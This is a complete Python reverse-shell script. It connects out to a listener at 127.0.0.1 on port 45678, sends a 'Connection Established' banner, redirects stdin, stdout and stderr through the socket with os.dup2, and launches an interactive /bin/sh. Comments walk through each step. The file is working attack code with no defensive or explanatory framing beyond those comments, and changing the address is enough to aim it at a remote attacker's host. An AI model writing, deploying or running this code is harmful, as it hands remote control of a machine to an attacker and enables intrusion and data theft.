import os
import subprocess
import socket


def main():
    target_ip = "127.0.0.1"
    target_port = 45678

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # 1. Initiate an outbound TCP connection back to the listener on 127.0.0.1:45678.
        s.connect((target_ip, target_port))
        # 2. Transmit a banner message to the listener indicating the socket is connected.
        s.sendall(b"[*] Connection Established\n")

        # 3. Duplicate the socket's file descriptor over standard stream handles:
        #    0 = stdin (keyboard/input stream)
        #    1 = stdout (display/output stream)
        #    2 = stderr (error output stream)
        # This redirects all process input and output through the network socket.
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        # Spawn an interactive shell session 
        subprocess.call(["/bin/sh", "-i"])

    except socket.error as e:
        print(f"[-] Connection failed: {e}")


if __name__ == "__main__":
    main()